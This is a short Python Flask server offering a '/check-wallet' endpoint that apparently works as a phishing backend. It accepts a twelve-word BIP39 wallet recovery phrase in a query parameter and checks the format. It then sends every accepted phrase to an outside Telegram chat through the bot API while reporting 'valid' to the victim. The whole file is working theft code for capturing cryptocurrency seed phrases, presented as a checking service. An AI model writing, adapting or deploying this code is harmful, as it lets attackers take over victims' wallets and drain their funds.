from flask import Flask, request
import requests
from mnemonic import Mnemonic
import os

app = Flask(__name__)
mnemo = Mnemonic("english")

# Fetch from environment or fallback
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def is_12_words_from_bip39(phrase):
    words = phrase.strip().split()
    return len(words) == 12 and all(word in mnemo.wordlist for word in words)

@app.route("/check-wallet", methods=["GET"])
def check_wallet():
    mnemonic_phrase = request.args.get("mnemonic", "").strip()

    if not mnemonic_phrase:
        return "Mnemonic is missing", 400

    # Validate it loosely: must be 12 BIP39 words
    if not is_12_words_from_bip39(mnemonic_phrase):
        return "Invalid mnemonic", 400

    # Optional: use strict check with checksum (uncomment if needed)
    # if not mnemo.check(mnemonic_phrase):
    #     return "Checksum invalid", 400

    # Send to Telegram
    message = f"✅ VALID MNEMONIC:\n\n{mnemonic_phrase}"
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.get(telegram_url, params={"chat_id": TELEGRAM_CHAT_ID, "text": message})

    return "valid", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
